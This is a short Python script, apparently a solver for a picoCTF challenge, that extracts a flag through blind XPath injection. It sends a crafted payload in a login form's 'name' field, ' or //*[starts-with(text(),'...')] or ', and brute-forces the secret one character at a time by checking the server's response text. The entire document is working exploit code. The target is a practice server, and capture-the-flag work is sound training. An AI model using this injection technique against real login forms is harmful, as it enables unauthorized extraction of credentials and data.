import requests
from string import ascii_lowercase, ascii_uppercase, digits

url = 'http://mercury.picoctf.net:59946/'
rightPath = "on the right path"
flag = "picoCTF{"
chars = ascii_uppercase + ascii_lowercase + digits + "_&*%$#@}"

while True:
    for ch in chars:
        x = requests.post(url, data={
            'name': f"' or //*[starts-with(text(),'{flag+ch}')] or '",
            'pass': ""
        })
        if rightPath in x.text:
            flag += ch
            print(flag)
        if '}' in flag:
            print(f"final flag: {flag}")
            exit()
